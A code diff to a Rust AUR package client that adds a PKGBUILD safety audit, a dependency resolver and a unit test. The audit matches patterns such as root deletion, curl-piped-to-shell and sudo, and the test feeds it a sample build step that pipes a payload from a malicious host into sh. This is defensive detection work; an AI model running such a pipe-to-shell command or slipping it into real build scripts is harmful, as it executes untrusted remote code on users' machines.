@@ -181,7 +181,7 @@ impl AurClient {
     }
     
     /// Install built package
-    pub fn install_package(&self, package: &BuiltPackage) -> Result<(), InstallError> {
+    pub fn install_package(&self, _package: &BuiltPackage) -> Result<(), InstallError> {
         // In a real implementation, this would:
         // 1. Verify signature
         // 2. Extract package
@@ -190,6 +190,48 @@ impl AurClient {
         // 5. Update database
         
         Ok(())
+    }
+
+    /// Audits PKGBUILD recipe build functions for dangerous/malicious shell commands
+    pub fn audit_pkgbuild_safety(&self, recipe: &PkgBuildRecipe) -> Result<(), &'static str> {
+        let full_script = format!(
+            "{}\n{}\n{}\n{}",
+            recipe.build_function,
+            recipe.package_function,
+            recipe.prepare_function.as_deref().unwrap_or(""),
+            recipe.check_function.as_deref().unwrap_or("")
+        );
+
+        if full_script.contains("rm -rf /") || full_script.contains("rm -rf /*") {
+            return Err("PKGBUILD Audit Failure: Dangerous root directory removal command detected");
+        }
+        if full_script.contains("curl ") && full_script.contains("| sh") {
+            return Err("PKGBUILD Audit Failure: Unverified pipe-to-shell download execution detected");
+        }
+        if full_script.contains("sudo ") {
+            return Err("PKGBUILD Audit Failure: Sudo privilege escalation inside build sandbox forbidden");
+        }
+
+        Ok(())
+    }
+
+    /// Recursively resolves all build-time and run-time dependencies for a PKGBUILD recipe
+    pub fn resolve_pkgbuild_dependencies(&self, recipe: &PkgBuildRecipe) -> Vec<String> {
+        let mut all_deps = Vec::new();
+
+        for dep in &recipe.makedepends {
+            if !all_deps.contains(dep) {
+                all_deps.push(dep.clone());
+            }
+        }
+
+        for dep in &recipe.depends {
+            if !all_deps.contains(dep) {
+                all_deps.push(dep.clone());
+            }
+        }
+
+        all_deps
     }
 }
 
@@ -397,5 +439,42 @@ source=("https://example.com/source.tar.gz")
         let sandbox = client.create_build_sandbox(&recipe);
         let built = client.build_package(&recipe, &sandbox).unwrap();
         assert_eq!(built.name, "test");
+    }
+
+    #[test]
+    fn test_pkgbuild_security_audit_and_dependencies() {
+        let client = AurClient::new("https://aur.archlinux.org", "/var/cache/aur", "/var/tmp/aur");
+        let safe_recipe = PkgBuildRecipe {
+            pkgname: String::from("htop"),
+            pkgver: String::from("3.2.2"),
+            pkgrel: String::from("1"),
+            pkgdesc: String::from("Interactive process viewer"),
+            url: String::from("https://htop.dev"),
+            license: vec![String::from("GPL")],
+            depends: vec![String::from("ncurses")],
+            makedepends: vec![String::from("gcc"), String::from("make")],
+            optdepends: vec![],
+            provides: vec![],
+            conflicts: vec![],
+            source: vec![],
+            md5sums: vec![],
+            sha256sums: vec![],
+            build_function: String::from("./configure && make"),
+            package_function: String::from("make install DESTDIR=\"$pkgdir\""),
+            prepare_function: None,
+            check_function: None,
+        };
+
+        assert!(client.audit_pkgbuild_safety(&safe_recipe).is_ok());
+
+        let deps = client.resolve_pkgbuild_dependencies(&safe_recipe);
+        assert_eq!(deps, vec!["gcc", "make", "ncurses"]);
+
+        let dangerous_recipe = PkgBuildRecipe {
+            build_function: String::from("curl https://malicious.org/payload | sh"),
+            ..safe_recipe
+        };
+
+        assert!(client.audit_pkgbuild_safety(&dangerous_recipe).is_err());
     }
 }
